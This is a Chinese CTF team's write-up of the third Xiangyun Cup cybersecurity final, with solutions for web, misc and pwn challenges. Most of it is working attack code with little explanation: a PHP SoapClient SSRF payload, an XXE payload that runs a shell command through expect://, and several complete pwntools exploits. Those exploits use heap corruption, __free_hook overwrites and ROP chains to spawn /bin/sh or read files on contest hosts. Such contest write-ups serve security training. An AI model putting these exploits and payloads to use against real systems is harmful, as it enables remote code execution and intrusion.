# 第三届“祥云杯”网络安全大赛决赛-WriteUp By EDISEC

> 原文: https://www.ctfiot.com/135246.html
> ID: 135246

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

message_board

<?php$target = 'http://127.0.0.1/index.php?s=login';$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^Cookie: PHPSESSID=edisec^^Content-Length: 32^^^^username=admin&password=password','uri'=> "a"));$a = serialize($b);$a = str_replace('^^',"rn",$a);$a = str_replace('&', '%26', $a);echo bin2hex(urldecode($a));?>

2

babyweb

<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "expect://mv$IFSxx.png$IFSxx.php" >]><root><name>&xxe;</name></root>

02

Misc

1

Twin shadow

import reimport binascii
n = 598795result = ''fina = ''f=open('list.txt','r').read()steps=f.split("n")
step_list=[]for i in steps: step_list.append(int(i,16))
file = open('1.mp3','rb')num=0while num < len(step_list) : file.seek(n,0) n += step_list[num] file_read_result = file.read(1) read_content = bin(ord(file_read_result))[-1] result = result + read_content num+=1print(result)

import re
fina = ''result = '01010100010010000110010100101101010100000110111101110111011001010101001000101101011101000110111100101101010000100101001001100101011000010110101100101101011101000100100001100101001011010100011001100001011101000110010100101101001100010101001100101101010100110111010101010010011001010110110001011001001011010110110000110001011010110110010100101101011101000100100000110011001011010100001001001100010000010100010000110011001000000011011101101111001011010110001001100101001000000110110100110000011101100011001101000100001000000100010001001111010101110110111000000000'textArr = re.findall('.{'+str(8)+'}', result)# textArr.append(result[(len(textArr)*8):])for i in textArr: fina = fina + chr(int(i,2)).strip('n')print(fina)

03

PWN

1

pwn_ad3

_DWORD *__fastcall sub_1530(__int64 a1, int a2, int a3){ _DWORD *v4; // rbp int v5; // r12d int v6; // eax bool v8; // [rsp+Eh] [rbp-3Ah] bool v9; // [rsp+Fh] [rbp-39h]
 v4 = calloc(1uLL, 0x20F0uLL); v8 = (((_BYTE)dword_628C * ((_BYTE)dword_628C - 1)) & 1) == 0; v5 = 2112114787; if ( (((_BYTE)dword_628C * ((_BYTE)dword_628C - 1)) & 1) == 0 ) v5 = 534868956; v9 = dword_6294 < 10; if ( dword_6294 < 10 ) v5 = 534868956; v6 = 1909852961; do {LABEL_9: if ( v6 != 1909852961 ) { if ( v6 == 2112114787 ) { *(_QWORD *)v4 = a1; v4[2] = a2; *((_QWORD *)v4 + 2) = calloc(a3, 4uLL); v4[6] = a3; v6 = -483786444; break; } goto LABEL_20; } v6 = 2112114787; if ( v9 ) v6 = -483786444; if ( v8 ) v6 = -483786444; } while ( v6 > 1909852960 ); while ( v6 == -483786444 ) { *(_QWORD *)v4 = a1; v4[2] = a2; *((_QWORD *)v4 + 2) = calloc(a3, 4uLL); v4[6] = a3; v6 = v5; if ( v5 > 1909852960 ) goto LABEL_9; } if ( v6 != 534868956 ) { while ( 1 )LABEL_20: ; } return v4;}

//a1=main函数的栈地址(也是我们输入vmcode的地址) a2=40000 a3=0sub_1530:
_DWORD *v4;v4 = calloc(1uLL, 0x20F0uLL);*(_QWORD *)v4 = a1;v4[2] = a2;*((_QWORD *)v4 + 2) = calloc(a3, 4uLL);v4[6] = a3;*(_QWORD *)v4 = a1;v4[2] = a2;*((_QWORD *)v4 + 2) = calloc(a3, 4uLL);v4[6] = a3;return v4;

struct vm{ int *code_addr; int size; int *regs; int r_num; int stack[0x830];};

v4->code_addr = (int *)a1;v4->size = a2;v4->regs = (int *)calloc(a3, 4uLL);v4->r_num = a3;

def push(a): return p32(9)+p32(a) def push_r(a): return p32(0xb)+p32(a)    def pop_r(a):               return p32(0xd)+p32(a)              def again():               return p32(0x12)              def show(a):               return p32(0xe)*a

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./chall'#context.arch='amd64'libc_base=0heap_base=0idx=0x10while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' b *$rebase(0x1410) '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9092) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(0.5)
 def push(a): return p32(9)+p32(a)
 def push_r(a): return p32(0xb)+p32(a)
 def pop_r(a): return p32(0xd)+p32(a)
 def again(): return p32(0x12)
 def show(a): return p32(0xe)*a
 gdb_attach(io,gdb_text) io.sendafter('input: ',show(7)+again()) io.recvuntil('0n') heap_addr1=int(io.recv(5)[:-1],16) heap_addr2=int(io.recv(8),16)+0x20 io.recvuntil('9c40n') stack_addr1=int(io.recv(5)[:-1],16) stack_addr2=int(io.recv(8),16)+0x9C58
 pay=show(3)+push(stack_addr2)+push(stack_addr1) pay+=push_r(0)+push_r(1)+show(4)+push(heap_addr2)+push(heap_addr1) io.sendafter('input: ',pay+again()) io.recvuntil('n') io.recvuntil('n') io.recvuntil('n') libc1=int(io.recv(5)[:-1],16) libc_base=int(io.recv(8),16)-0x23f90-243
 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook']

 pay=show(3)+push(free_hook_addr-8)+push(libc1) pay+=push(u32('/bin'))+pop_r(0) pay+=push(u32('/shx00'))+pop_r(1) pay+=push(system_addr)+pop_r(2) pay+=push(libc1)+pop_r(3) io.sendafter('input: ',pay+again())

 # success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) # success('stack_addr:'+hex((stack_addr1<<32)+stack_addr2))
 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

2

sitnote

// local variable allocation has failed, the output may be wrong!int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ __int64 v3; // rcx __int64 v4; // rdx __int64 v5; // rcx unsigned __int64 v6; // rdi __int64 v7; // rsi __int64 v8; // rax int v9; // eax __int64 v10; // rcx __int64 v11; // rsi __int64 v12; // rdi __int64 v13; // rsi __int64 v14; // rcx __int64 v15; // rsi __int64 v16; // rdi int v17; // esi __int64 v18; // rax int v19; // eax _DWORD v20[6]; // [rsp+0h] [rbp-130h] BYREF __int64 *v21; // [rsp+18h] [rbp-118h] int i; // [rsp+E0h] [rbp-50h] char v23; // [rsp+E6h] [rbp-4Ah] bool v24; // [rsp+E7h] [rbp-49h] _DWORD *v25; // [rsp+E8h] [rbp-48h] __int64 *v26; // [rsp+F0h] [rbp-40h] __int64 v27; // [rsp+F8h] [rbp-38h]
 v4 = (unsigned int)(dword_6C2688 - 1); v23 = ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0; v24 = dword_6C2690 < 10; v3 = 112080690LL; LOBYTE(argv) = 0; LOBYTE(argc) = 0; LOBYTE(v4) = 1; if ( !((dword_6C2690 < 10 && (v23 & 1) != 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~v23) & 1) ) goto LABEL_34; while ( 1 ) { v25 = &v20[-4]; v26 = (__int64 *)&v20[-4]; v20[-4] = 0; init(*(_QWORD *)&argc, argv, v4, v3); v3 = 2845733290LL; v4 = 3632247323LL; LOBYTE(argv) = 1; *(_QWORD *)&argc = (((_BYTE)dword_6C2688 - 7 + 6) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10 && argc == 0) | (dword_6C2690 < 10) ^ (argc == 0) ) break;LABEL_34: v20[-4] = 0; init(*(_QWORD *)&argc, argv, v4, v3); i = 112080690; } for ( i = 99838845; ; i = 99838845 ) { v5 = 3325517854LL; LOBYTE(v4) = 1; v6 = (unsigned int)dword_6C2690; v7 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( !((dword_6C2690 < 10 && (_DWORD)v7 == 0) | (dword_6C2690 < 10) ^ ((_DWORD)v7 == 0)) ) goto LABEL_35; while ( 1 ) { v8 = read_long(v6, v7, v4, v5); v5 = 3801052166LL; v4 = 817338735LL; v6 = (unsigned __int64)v26; *v26 = v8; v27 = *v26; LOBYTE(v7) = 1; if ( (dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1 ) break;LABEL_35: v18 = read_long(v6, v7, v4, v5); v5 = (__int64)v26; *v26 = v18; i = -969449442; v21 = v26; } i = 1818302425; if ( v27 < 4 ) { if ( v27 >= 2 ) { v4 = v27; if ( v27 >= 3 ) { show(v6, v7, v27, 2777366289LL); i = 115005891; goto LABEL_31; } v10 = 23550316LL; v11 = 0xFFFFFFFFLL; v12 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; LOBYTE(v4) = 1; if ( (dword_6C2690 < 10 && (_DWORD)v12 == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~((_DWORD)v12 == 0)) & 1 ) goto LABEL_20; while ( 1 ) { edit(v12, v11, v4, v10); i = 23550316;LABEL_20: edit(v12, v11, v4, v10); v10 = 3300370907LL; v12 = (unsigned int)dword_6C2690; v4 = 0xFFFFFFFFLL; v11 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v11 == 0) | (dword_6C2690 < 10 && (_DWORD)v11 == 0) ) { i = 115005891; goto LABEL_31; } } } if ( v27 == 1 ) { add(v6, v7, 1LL, 3625747768LL); i = 115005891; goto LABEL_31; } goto LABEL_28; } if ( v27 >= 6 ) { if ( v27 < 7 ) { v14 = 2980125399LL; v15 = (unsigned int)dword_6C2690; v16 = (unsigned int)(dword_6C2688 - 1); v4 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v4 == 0) | (dword_6C2690 < 10 && (_DWORD)v4 == 0) ) {LABEL_26: sub_401650(v16, v15, v4, v14); v14 = 3602426981LL; v16 = (unsigned int)dword_6C2690; v15 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; LOBYTE(v4) = 1; if ( (dword_6C2690 < 10 && (_DWORD)v15 == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~((_DWORD)v15 == 0)) & 1 ) { i = 115005891; goto LABEL_31; } } sub_401650(v16, v15, v4, v14); i = -1314841897; goto LABEL_26; } v9 = -1976565134; if ( v27 == 7 ) v9 = 1617921039; i = v9;LABEL_28: i = -1369147532; v17 = (((_BYTE)dword_6C2688 - 120 + 119) * (_BYTE)dword_6C2688) & 1; if ( !((dword_6C2690 < 10 && v17 == 0) | (dword_6C2690 < 10) ^ (v17 == 0)) ) goto LABEL_39; while ( 1 ) { sub_40B960("Unknown"); v4 = 2208571241LL; if ( (dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1 ) { i = 115005891; goto LABEL_31; }LABEL_39: v19 = sub_40B960("Unknown"); i = 2025167804; v20[5] = v19; } } if ( v27 >= 5 ) { v13 = (((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1; if ( (dword_6C2690 < 10) ^ ((_DWORD)v13 == 0) | (dword_6C2690 < 10 && (_DWORD)v13 == 0) ) backdoor(0LL, v13, 0xFFFFFFFFLL, 3012737502LL); backdoor(0LL, v13, 0xFFFFFFFFLL, 3012737502LL); } delete(v6, v7, v27, 839414269LL); i = 115005891;LABEL_31: if ( !((dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | ((unsigned __int8)~(dword_6C2690 < 10) ^ (unsigned __int8)~(((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) & 1) ) goto LABEL_40; while ( !((dword_6C2690 < 10 && ((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0) | (dword_6C2690 < 10) ^ (((((_BYTE)dword_6C2688 - 1) * (_BYTE)dword_6C2688) & 1) == 0)) )LABEL_40: i = 1652216043; }}

__int64 __fastcall sub_401650(__int64 a1, __int64 a2){ v31 = ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0; v32 = dword_6C268C < 10; if ( !(((dword_6C268C < 10) ^ v31) & 1 | (dword_6C268C < 10 && v31)) ) goto LABEL_17; while ( 1 ) { v33 = v23; v2 = &v23[-16]; v34 = &v23[-16]; v35 = dword_6C1330 != 0; v3 = dword_6C268C; v4 = dword_6C2680 - 1233492817 + 1233492816; v5 = (((_BYTE)dword_6C2680 - 81 + 80) * (_BYTE)dword_6C2680) & 1; LOBYTE(a2) = (dword_6C268C < 10) ^ (v5 == 0); if ( (unsigned __int8)a2 | (dword_6C268C < 10 && v5 == 0) ) break;LABEL_17: v30 = -74059996; } LOBYTE(v2) = v35; if ( v35 ) { result = sub_40B960("You have use the backdoor once"); v30 = 646810775; v29 = result; } else { dword_6C1330 = 1; *(_QWORD *)v33 = 0LL; v28 = printf((unsigned int)"Input: ", a2, (_DWORD)v2, 1528823701, v3, v4, v23[0]); v9 = read_long("Input: ", a2, v7, v8); *(_QWORD *)v33 = v9; if ( *(_QWORD *)v33 >= 0x10uLL ) goto LABEL_9; if ( !((dword_6C268C < 10) ^ (((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) | (dword_6C268C < 10 && ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0)) ) goto LABEL_18; while ( 1 ) { v10 = *(_QWORD *)v33; v36 = (&buf)[*(_QWORD *)v33] == 0LL; v11 = dword_6C2680 - 633399322 + 633399321; v12 = (((_BYTE)dword_6C2680 - 26 + 25) * (_BYTE)dword_6C2680) & 1; if ( (dword_6C268C < 10) ^ (v12 == 0) | (dword_6C268C < 10 && v12 == 0) ) break;LABEL_18: v30 = 906460608; v26 = v33; } if ( v36 ) {LABEL_9: v13 = (((_BYTE)dword_6C2680 - 103 + 102) * (_BYTE)dword_6C2680) & 1; if ( !((dword_6C268C < 10) ^ (v13 == 0) | (dword_6C268C < 10 && v13 == 0)) ) goto LABEL_19; while ( 1 ) { result = 860644631LL; if ( (dword_6C268C < 10) ^ (((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) | (dword_6C268C < 10 && ((((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1) == 0) ) break;LABEL_19: v30 = -206821341; } v30 = 646810775; } else { v14 = -2078560568; v15 = dword_6C2680 - 1692356262 + 1692356261; v16 = (((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1; LOBYTE(v11) = 0; LOBYTE(v10) = 1; if ( !((dword_6C268C < 10 && (_DWORD)v16 == 0) | ((unsigned __int8)~(dword_6C268C < 10) ^ (unsigned __int8)~((_DWORD)v16 == 0)) & 1) ) goto LABEL_20; while ( 1 ) { v27 = printf((unsigned int)"Input: ", v16, v10, v14, v15, v11, v23[0]); v19 = read_long("Input: ", v16, v17, v18); v14 = 307732780; LODWORD(v10) = 847373277; *(_QWORD *)v34 = v19; v37 = *(_QWORD *)v34 < count[*(_QWORD *)v33]; v16 = 0xFFFFFFFFLL; v11 = (((_BYTE)dword_6C2680 - 1) * (_BYTE)dword_6C2680) & 1; LOBYTE(v15) = (dword_6C268C < 10) ^ (v11 == 0); if ( (unsigned __int8)v15 | (dword_6C268C < 10 && v11 == 0) ) break;LABEL_20: v25 = printf((unsigned int)"Input: ", v16, v10, v14, v15, v11, v23[0]); v22 = read_long("Input: ", v16, v20, v21); *(_QWORD *)v34 = v22; v30 = -2078560568; v24 = v34; } result = 646810775LL; if ( v37 ) { result = *(_QWORD *)v34; count[*(_QWORD *)v33] = *(_QWORD *)v34; v30 = 646810775; } } } return result;}

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./sitnote'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9095) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): sleep(0.1) io.sendline(str(a))
 def add(a,b): choice(1) io.sendlineafter('Input: ',str(a)) io.sendlineafter('Input: ',str(b))
 def edit(a,b): choice(2) io.sendlineafter('Input: ',str(a)) io.sendafter('Output: ',b)
 def show(a): choice(3) io.sendlineafter('Input: ',str(a))
 def delete(a): choice(4) io.sendlineafter('Input: ',str(a))
 for i in range(0xa): add(i,0x78)
 for i in range(9): delete(i)
 for i in range(0x9): add(i,0x78)
 add(10,0x78) delete(9) delete(10) edit(8,p64(0x6c1ec8)) add(9,0x78) add(10,0x78) edit(9,'/bin/shx00') edit(10,p64(0x40ab70))
 delete(9)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

3

message_system

start=0x11f7end=0x5e30
for addr in idautils.Heads(start, end): if 'call sub_1158' == idc.GetDisasm(addr): addr1=addr addr3=addr+5 while True: addr2=addr1 addr1=idc.prev_head(addr1) if 'mov r12, [rbp+' in idc.GetDisasm(addr1): addr2=addr1 addr1=idc.prev_head(addr1) addr2=addr1 addr1=idc.prev_head(addr1) break if 'mov rax,'in idc.GetDisasm(addr1): call_addr=0 call_addr+=idc.get_wide_byte(addr1+3) call_addr+=(idc.get_wide_byte(addr1+4)<<8) call_addr+=(idc.get_wide_byte(addr1+5)<<16) call_addr+=(idc.get_wide_byte(addr1+6)<<24) call_addr+=addr2 call_addr=idc.get_wide_word(call_addr) print(hex(call_addr)) print(idc.GetDisasm(addr1))
 if 'lea rax,'in idc.GetDisasm(addr1): call_addr=0 call_addr+=idc.get_wide_byte(addr1+3) call_addr+=(idc.get_wide_byte(addr1+4)<<8) call_addr+=(idc.get_wide_byte(addr1+5)<<16) call_addr+=(idc.get_wide_byte(addr1+6)<<24) call_addr+=addr2 # call_addr&=0xffffffff print(hex(call_addr)) print(idc.GetDisasm(addr1))
 value=call_addr-addr3 for i in range(4): v1=(value>>(i*0x8))&0xff idc.patch_byte(addr+1+i,v1)

for i in range(0xf): add(i,'keer','aaaa')
for i in range(0x9): link(i,9,i+1,0)
我们创建了0xf个线程，然后，构成了这么一个回路线程0里面存的除了与主线程发送和接收主线程的管道还存储了id为9 但是发送和接收都是与线程1交互的结构体流线程1里面存的除了与主线程发送和接收主线程的管道还存储了id为9 但是发送和接收都是与线程2交互的结构体流···以此类推如果我们通过主线程的选项10向线程0发送一个id为9，选项为2的包，我们先看下，下列过程（线程中）

经过上图，发送个线程0，id为9，选项为2的数据包会：主线程->线程0->线程1->线程2->线程3->线程4->线程5->线程6->线程7->线程8->线程9然后进入线程中选项二copy栈中数据重新倒着走一遍线程9->线程8->线程7->线程6->线程5->线程4->线程3->线程2->线程1->线程0->主线程这样就可以绕过v15<=7这个限制了之后就是栈上数据泄露和栈上数据覆盖的操作了。

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./messageSystem'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' b *$rebase(0x2D11) b *$rebase(0x2AF4) '''
 # gdb_text=''' # b *$rebase(0x4A42) # b *$rebase(0x2AA2) # b *$rebase(0x2C0C) # b *$rebase(0x2809) # b *$rebase(0x33A5) # b *$rebase(0x2559) # b *$rebase(0x352B) # '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.16.9.5',9096) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.31.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('>> ',str(a))
 def add(a,b,c): choice(1) io.sendlineafter('addressID: ',str(a)) io.sendlineafter('nodeName: ',b) io.sendlineafter('nodeMessage: ',c)
 def link(a,b,c,d): choice(3) io.sendlineafter('addressID1: ',str(a)) io.sendlineafter('addressID1: ',str(b)) io.sendlineafter('addressID2: ',str(c)) io.sendlineafter('addressID2: ',str(d))
 def gift(idx,pay): choice(10) io.sendlineafter('addressID: ',str(idx)) io.sendlineafter('size: ',str(len(pay))) io.sendafter('data: ',pay)
 def show_idx(id,index): pay=p32(2)+p32(index) gift(id,pay)
 def edit_idx(id,index,data): pay=p32(1)+p32(index)+p32(0x20)+data gift(id,pay)
 for i in range(0xf): add(i,'keer','aaaa')
 for i in range(0x9): link(i,9,i+1,0)
 show_idx(9,0xffffffff) io.recvuntil('ret: ') io.recv(0x18) leak=u64(io.recvuntil('x7f')[-6:]+'x00x00') off_addr=0x225b0+0x22000 # off_addr=0x225b0+0x22000 libc_base=(leak-off_addr-0x30) libc.address=libc_base
 bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=libc.search(asm('pop rax;ret')).next() pop_rdi_ret=libc.search(asm('pop rdi;ret')).next() pop_rsi_ret=libc.search(asm('pop rsi;ret')).next() pop_rdx_ret=libc.search(asm('pop rdx;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 index=0x100000000-(0x320//0x20) pay=p64(0)+p64(libc.sym['memcpy'])+p64(pop_rdi_ret) pay+=p64(bin_sh_addr)+p64(system_addr) edit_idx(9,index,pay)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text) io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

4

note

def login(): choice(1) io.recvuntil('challenge: ') data=io.recvuntil('n') key=[] c='' sum1=0 for i in range(15): aaa=int(data[i*2:i*2+2],16) c+=(hex(aaa^i^0x11)[2:]).ljust(2,'0') sum1+=aaa^i^0x11
 c+=(hex(0x100-(sum1%0x100))[2:]).rjust(2,'0') print c io.sendlineafter('response: ',c)

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./note'#context.arch='amd64'libc_base=0heap_base=0while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('172.20.2.1',9007) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.31.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(0.5)
 def choice(a): io.sendlineafter('>> ',str(a))
 def add(a,b,c): choice(2) io.sendlineafter('safe -> 1): ',str(c)) io.sendlineafter('size: ',str(a)) io.sendafter('content: ',b)
 def show(a): choice(3) io.sendlineafter('index: ',str(a))
 def delete(a): choice(4) io.sendlineafter('index: ',str(a))
 def login(): choice(1) io.recvuntil('challenge: ') data=io.recvuntil('n') key=[] c='' sum1=0 for i in range(15): aaa=int(data[i*2:i*2+2],16) c+=(hex(aaa^i^0x11)[2:]).ljust(2,'0') sum1+=aaa^i^0x11
 c+=(hex(0x100-(sum1%0x100))[2:]).rjust(2,'0') print c io.sendlineafter('response: ',c)
 login() add(0x4e0,'a'*0x10,0) add(0x4e0,'a'*0x10,0) data='' for i in range(0x100): delete(0) add(0x4f2,'a'*0x4f0,1) show(0) io.recvuntil('content: ') data=io.recvuntil('n-----------menu',drop=True) if len(data) >0x4f0 : break
 key=[] for i in range(0x10): key.append(ord('a')^ord(data[0x4f0+i:0x4f1+i]))
 add(0xe0,'a'*0x10,0) add(0x4e0,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x180,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0x180,'a'*0x10,0) add(0x80,'a'*0x10,0)
 delete(3) add(0x4e0,'a'*8,0) show(3)
 leak=u64(io.recvuntil('x7f')[-6:]+'x00x00') libc_base=((leak-libc.sym['_IO_2_1_stdin_'])>>12)<<12 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=libc.search(asm('pop rax;ret')).next() pop_rdi_ret=libc.search(asm('pop rdi;ret')).next() pop_rsi_ret=libc.search(asm('pop rsi;ret')).next() pop_rdx_ret=libc.search(asm('pop rdx;pop rbx;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 def encode(a): j=0 c='' while j<len(a): for i in range(0x10): c+=chr(ord(a[j:j+1])^key[i]) j+=1 if j>=len(a): break return c
 delete(12) delete(5)
 for i in range(0x20): delete(4) add(0xf8,encode('a'*0xe8+p64(0x91)+p64(libc.sym['environ']-0x10)),1)
 add(0x80,'a'*0x10,0) add(0x80,'a'*0x10,0) show(12) io.recvuntil('a'*0x10) stack_addr=u64(io.recv(6)+'x00x00')-0x108
 delete(11) delete(7)
 for i in range(0x20): delete(6) add(0xf8,encode('a'*0xe8+p64(0x191)+p64(stack_addr)),1)
 pay='./flagx00x00' pay+=p64(pop_rdi_ret)+p64(stack_addr) pay+=p64(pop_rsi_ret)+p64(0) pay+=p64(pop_rax_ret)+p64(2)
 pay+=p64(syscall_ret) pay+=p64(pop_rax_ret)+p64(0) pay+=p64(pop_rdi_ret)+p64(3) pay+=p64(pop_rdx_ret)+p64(0x30)*2 pay+=p64(pop_rsi_ret)+p64(stack_addr-0x300) pay+=p64(syscall_ret)
 pay+=p64(pop_rax_ret)+p64(1) pay+=p64(pop_rdi_ret)+p64(1) pay+=p64(pop_rsi_ret)+p64(stack_addr-0x300) pay+=p64(syscall_ret) add(0x180,'aaaa',0) add(0x180,encode(pay),0)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) success('stack_addr:'+hex(stack_addr)) gdb_attach(io,gdb_text)
 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue

5

hellollvm

void Add(int a){ return ;}void Del(int a){ return ;}
void Edit(int a,int idx,int value){ return ;}
void Alloc(){ return ;}
void EditAlloc(){ return ;}

//b *(0x7fc2b50b6000+0x86F5)#include <stdio.h>void Add(int a){ return ;}
void Del(int a){ return ;}
void Edit(int a,int idx,int value){ return ;}
void Alloc(){ return ;}
void EditAlloc(){ return ;}
